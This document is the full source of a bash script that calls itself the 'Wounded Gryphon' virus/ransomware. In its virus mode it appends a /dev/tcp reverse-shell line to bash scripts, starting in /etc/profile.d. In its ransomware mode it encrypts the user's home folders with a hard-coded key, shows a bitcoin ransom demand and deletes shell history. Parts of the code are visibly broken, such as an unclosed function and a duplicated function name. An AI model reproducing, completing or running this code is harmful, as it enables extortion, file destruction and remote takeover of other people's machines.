#!/bin/bash

#                   # 
#    __      __      \                .___         .___
#   /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
#   \   \/\/   /  _ \|  |  \/    \ / __ _/ __ \ / __ | -----------
#    \        (  <_> |  |  |   |  / /_/ \  ___// /_/ | ------------
#     \__/\  / \____/|____/|___|  \____ |\___  \____ | -----------
#     _____\/                   \/ __  \/    \/     \/ ----------
#    /  ___ \_______ ___.________ |  |__   ____   ____  ---------
#   /   \  __\_  __ <   |  \____ \|  |  \ /  _ \ /    \ ----------
#   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
#    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
#       /   \/       \/    |__|        \/      \     \/ ---------
#      / Wonded Gryphon v3.6  ______----------- # ---------------
#     #          _______,---'__,---' ---------------------------
#            _,-'---_---__,---' -----------------------------
#     /_ #   (,  ---____', --------------------------------
#    /  /,,   `, ,-' -------------------------------------
#   ;/)   ,',,_/,' # -------------------------------------
#   | /\   ,.'//\ / ---------------------------------------
#   `-` \ ,,'    /.   # -------------------------------------
#        `',   ,-- `./ -----------------------------------------
#        '/ / |     /`, -----------------------------------------
#        //'',.\_    .\\ -----,{==>- ------------------------------
#     __//   __;_`-  \ `;.__,;' ------------------------------------
#   ((,--,) (((,------;  `--' --------------------------------------
#
# Created by TheG0df2ther a MalDev101 project
# This is only an experiment but it can be dangerous.
# I am not responsible for the damage.
# This is a virus/ransomware that works on unix systems with bash installed.
# Tested on Linux (Ubuntu, Debian) and MacOS (OSX)

SHEBANG="#!/bin/bash"

ME="$0"

CAT=$(cat "$me")

FLAG="#arrow"

VERSION="v3.6"

FLAG="$1"

PAYLOAD="" # Choose payload when infecting

MAXINFECTCOUNT=50 # Maximum infected files

CHOOSE_BANNER

# All THE BANNERS

function banner1() {
   
   echo "                _  #       _ "
   echo "              _/|  \ _   |\_ "
   echo "            _/_ |   \|\\ | _\ "
   echo "          _/_/| /  /   \|\ |\_\_     # "
   echo "        _/_/  |/  /  _  \/\|  \_\_  / "
   echo "      _/_/    ||  | | \*/ ||    \_\/   "
   echo "     /_/  | | |\  | \_ /  /| | |  \_\   # "
   echo "    //    ||| | \_/   \__/ | |||    \\ / "
   echo "   // __| ||\  \ ||    || /  /|| |__ \/ "
   echo "  //_/ \|||| \/\\||    ||//\/ ||||/ \_\\ "
   echo " ///    \\\\/   /()    ()\   \////    \\\ "
   echo " |/      \/    |    |    |     \/      \| "
   echo "              /_|  | |_  \  # "
   echo "              ///_| |_||\_ \/ "
   echo "              |//||/||\/||\/       WOUNDED GRYPHON $VERSION "
   echo "               / || ||/||/\/    "
   echo "                 {}/|| {}        "
   echo "                    ||            "
   echo "                    () "
}

function banner2() {

   echo "
                ++01100101 01110101++             =ඏ=             ++10101110 10100110++
              +011100110110   01001111000      0♢0Ŧ0♢0     00011110010   011011001110+
          +0110010001100101 0110000101100100   000卄000   0010011010000110 1010011000100110+
            +01101101011000010111001001101011++00+0卄00++++11010110010011101000011010110110+
                0111001101100  0010110111001100100 ⁆⁅ 0010011001110110100  0011011001110
                      011001100 110000101110010++= ⁆⁅ =++010011101000011 001100110
                        +01 10100001100101011 10010ʞk01001 11010100110000101 10+
                            +0111010001101111  +01ʞk10+  1111011000101110+
                                +110101011011  00.∴.00  110110101011+
                                  +01100101     0+1ʞk1+0    10100110+
                                  +1100101     +0+.∴.+0+     1010011+
                                    +1110010   +0+.∴.+0+   0100111+
                                      +1110100  01 ∴ 10  0010111+
                                                10 ∴ 01
                                                10 ∵ 01
                                                00.00
                                                  : :
                  Do you got what it takes? 
                            https://bit.ly/3b83sD9 "
}

function banner3() {
   echo "
                         # ------------------------------------------
          __      __      \ -------------- .___ ------- .___ --------
         /  \    /  \____  \_ __  ____   __| _/____   __| _/ ---------
         \   \/\/   /  _ \|  |  \/    \ / __ _/ __ \ / __ | -----------
          \        (  <_> |  |  |   |  / /_/ \  ___// /_/ | ------------
           \__/\  / \____/|____/|___|  \____ |\___  \____ | -----------
           _____\/                   \/ __  \/    \/     \/ ----------
          /  ___ \_______ ___.________ |  |__   ____   ____  ---------
         /   \  __\_  __ <   |  \____ \|  |  \ /  _ \ /    \ ----------
         \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
          \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
             /   \/       \/    |__|        \/      \     \/ ---------
            / Wonded Gryphon $VERSION  ----------------- # ---------------
           # ---------------------------------------------------------- "
}

function banner4() {
   echo "
                   _________
                  / ======= \
                 / __________\
                | ___________ |
                | | I Love  | |
                | |  BASH   | |
                | |_________| |________________________
                \=____________/                        )
                / ........... \   WOUNDED GRYPHON     /
               / ::::::::::::: \      $VERSION        =D-'
              (_________________) "
}

function banner_text() {
   
   echo "
   
   # Created by TheG0df2ther a MalDev101 project
   # This is only an experiment but it can be dangerous.
   # I am not responsible for the damage.
   # This is a virus/ransomware that works on unix systems with bash installed.
   # Tested on Linux (Ubuntu, Debian) and MacOS (OSX)
   #
   # If virus mode:
   #
   # Check if files are written in bash then start infecting them.
   # The virus ignores non bash scripts and already infected files
   #
   # If ransomware mode:
   #
   # Encrypt files in Desktop, Videos ... "
}

function error() {

   echo "_______________________________ ________ __________._."
   echo "\_   _____/\______   \______   \\_____  \\______   \ |"
   echo " |    __)_  |       _/|       _/ /   |   \|       _/ |"
   echo " |        \ |    |   \|    |   \/    |    \    |   \\|"
   echo "/_______  / |____|_  /|____|_  /\_______  /____|_  /__"
   echo "        \/         \/        \/         \/       \/ \/"
   echo "                                                      "
}

function help() {

   echo " Available opions: "
   echo " "
   echo " Show this page: --help"
   echo " Infect all bash files on the system: --infect"
   echo " Encrypt files in Desktop, Videos ...: --encrypt"
   echo " Self destruct when done: (--infect, --encrypt) --self-destruct "
   echo " Unencrypt files: --unencrypt "
   echo " Uninfect system: --uninfect "

# Virus mode

function check() {
   
   local IFBASH=$(grep -Fx "$SHEBANG" *)
   
   if [ "$IFBASH" =~ .*"$SHEBANG" ]

   then
      
      local LISTNOTREADY=$(echo "$IFBASH" | sed 's|:#!/bin/bash||')
      local LISTNOTREADYD=$(echo "$LISTNOTREADY" | tr "\n" " ")
      local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
      local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | sed '/bar/,+1 d')
      LIST=$(echo "$LISTNOTREADY2D" | tr "\n" " ")
       
      if [ "$LIST" == "" ]
       
      then
         
         foldercheck
      
      else
         
         infect
      
      fi
      
    else
       
       foldercheck
       
    fi
   
}

function foldercheck() {
   
   local LDIR=$(ls -d *)
   
   if [ "$LDIR" == "" ]

   then
      cd /

      check

   else
          
      echo "$LDIR" > LIST.txt
      
      CDDIR=$(shuf -n1 LIST.txt)
      
      cd "$CDDIR"
      
      check
   fi
}

# PAYLOAD

function infect() {
   
   # String you want to append to sh file. Example: reverse tcp bash (metasploit).
   # Responds to:
   # IP: 192.168.1.88
   # PORT: 8888

   echo "0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" >> "$LIST"
   echo "$FLAG" >> "$LIST"

   INFECTCOUNT=$(($INFECTCOUNT + 1))

   if [ "$INFECTCOUNT" == "$MAXINFECTCOUNT" ]

   then
      if [ "$@" =~ .*"--self-destruct" ]

      then
         cleanup
   
      else
         exit
   
      fi
   
   else
      check
   
   fi
   
}

# choose a random banner

function CHOOSE_BANNER() {
   
   banners=(banner1 banner2 banner3 banner4) ;
   THECHOSENONE="${banners[RANDOM%${#banners[@]}]}";
}

function BANNER() {
   
   "$THECHOSENONE"
   echo "   "
   banner_text
}

# start infecting autostart

function virus_start() {
   
   BANNER # Very important :)
   
   cd /etc/profile.d/
   
   check
   
   if [ "$@" =~ .*"--self-destruct" ]
   
   then
      cleanup
   
   else
      exit
   
   fi
}

# RANSOMWARE MODE

KEY="GrYpHoN" # KEY

CCRYPT="/bin/ccrypt"

function ccryptcheck() {
   
   if [ -f "$CCRYPT" ]

   then
      scan
    
   else
      sudo apt install ccrypt -yy
      brew install ccrypt
      yum install ccrypt
      pacman install ccrypt
      ccryptcheck
   
   fi
}

function encryptvideos() {
   
   cd "$HOME"
   cd Videos
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptdesktop() {
   
   cd "$HOME"
   cd Desktop
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptpictures() {
   
   cd "$HOME"
   cd Pictures
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptdocuments() {
   
   cd "$HOME"
   cd Documents
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptdownloads() {
   
   cd "$HOME"
   cd Downloads
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function encryptmusic() {
   
   cd "$HOME"
   cd Music
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.WOUND"
   done

}

function cleanup() {
   
   echo "#!/bin/bash" > Gryphon.sh
   echo "sleep 8" >> Gryphon.sh
   echo "sudo mv $ME /dev/null" >> Gryphon.sh
   chmod 755 Gryphon.sh 
   ./Gryphon
   exit
}

function ransom_start() {
   
   BANNER
   ccryptcheck
   sleep 5
   encryptdesktop
   sleep 5
   encryptdocuments
   sleep 5
   encryptdownloads
   sleep 5
   zenity --warning --text="Your files are encrypted by Wounded Gryphon! Pay 500$ worth in bitcoin to this bitcoin address: Your Bitcoin Address so you can receive the decrypt instructions"
   encryptmusic
   sleep 5
   encryptpictures
   sleep 5
   encryptvideos
   cd "$HOME" && rm .bash_history
   sleep 5
   
   if [ "$@" =~ .*"--self-destruct" ]

   then
      cleanup
   
   else
      exit
   
   fi
   
}

# Uninfect

function remcheck() {
   
   local IFBASH=$(grep -Fx "$SHEBANG" *)
   
   if [ "$IFBASH" =~ .*"$SHEBANG" ]

   then
      
      local LISTNOTREADY=$(echo "$IFBASH" | sed 's|:#!/bin/bash||')
      local LISTNOTREADYD=$(echo "$LISTNOTREADY" | tr "\n" " ")
      local LISTNOTREADY2=$(grep -Fx "$FLAG" "$LISTNOTREADYD")
      local LISTNOTREADY2D=$(echo "$LISTNOTREADY2" | sed 's|:#arrow||')
      LIST=$(echo "$LISTNOTREADY2D" | tr "\n" " ")
       
      if [ "$LIST" == "" ]
       
      then
         
         remfoldercheck
      
      else
         
         uninfect
      
      fi
      
    else
       
       remfoldercheck
       
    fi
   
}

function remfoldercheck() {
   
   local LDIR=$(ls -d *)
   
   if [ "$LDIR" == "" ]

   then
      cd /

      remcheck

   else
          
      echo "$LDIR" > LIST.txt
      
      CDDIR=$(shuf -n1 LIST.txt)
      
      cd "$CDDIR"
      
      remcheck
   fi
}


function uninfect() {
   
   sed -i '/"$PAYLOAD"/d' "$LIST"
   sed -i '/"$FLAG"/d' "$LIST"

   RINFECTCOUNT=$(($RINFECTCOUNT + 1))

   if [ "$RINFECTCOUNT" == $MAXINFECTCOUND ]

   then
      echo "Done.."
   
   else
      remcheck
   
   fi
   
}

function uninfect() {
   
   BANNER # Very important :)

   cd /etc/profile.d/

   remcheck
   
   if [ "$@" =~ .*"--self-destruct" ]
   
   then
      cleanup
   
   else
      exit
   
   fi
}

# Unencrypt

function unencryptvideos() {
   
   cd "$HOME"
   cd Videos
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptdesktop() {
   
   cd "$HOME"
   cd Desktop
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptpictures() {
   
   cd "$HOME"
   cd Pictures
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptdocuments() {
   
   cd "$HOME"
   cd Documents
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"
}

function unencryptdownloads() {
   
   cd "$HOME"
   cd Downloads
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"

}

function unencryptmusic() {
   
   cd "$HOME"
   cd Music
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccdecrypt "$LIST" -K "$KEY"

}

function unencrypt() {
   
   BANNER
   ccryptcheck
   sleep 5
   unencryptdesktop
   sleep 5
   unencryptdocuments
   sleep 5
   unencryptdownloads
   sleep 5
   unencryptmusic
   sleep 5
   unencryptpictures
   sleep 5
   unencryptvideos
   cd "$HOME" && rm .bash_history
   sleep 5
   
   if [ "$@" =~ .*"--self-destruct" ]

   then
      cleanup
   
   else
      exit
   
   fi
   
}


if [ "$FLAG" == "--infect" ]

then
   virus_start

elif [ "$FLAG" == "--encrypt" ]

then
   ransom_start
   
elif [ "$FLAG" == "--uninfect" ]

then
   uninfect

elif [ "$FLAG" == "--help" ]

then
   help
   
elif [ "$FLAG" == "--unencrypt" ]

then
   unencrypt

elif [ $# -le 0 ]

then
   error
   echo "   "
   echo "No arguments specified!"
   echo "Use --help to display options"

else
   error
   echo "   "
   echo "No such argument available!"
   echo "Use --help to display options" 

fi


#    |\                     /)      
#  /\_\\__               (_//
# |   `>\-`     _._       //`)  
#  \ /` \\  _.-.---.`-._ //
#   `    \|`  /     \  `|/
#         |   \.@-@./   |
#         |.../`\_/`\...|
#         |:://  _  \\::|
#         | | \     )|_ |
#         \/`\_`>  <_/ \/
#          \__/'---'\__/
#           `-. ::: .-'
#            //`:::`\\
#           //   '   \\
#          |/         \\
